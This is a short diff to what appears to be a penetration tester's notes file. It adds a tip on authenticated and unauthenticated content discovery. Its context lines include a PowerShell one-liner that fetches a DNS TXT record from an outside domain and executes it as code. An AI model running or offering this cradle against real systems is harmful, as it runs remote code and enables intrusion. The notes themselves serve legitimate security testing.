@@ -95,3 +95,5 @@ PowerShell --> ls \windows\temp
 ```bash
 powershell . (nslookup -q=txt parzival.sh)[-1]
 ```
+
+15\. Always perform content discovery both as an unauthenticated and authenticated user (provide cookies to tool of choice)
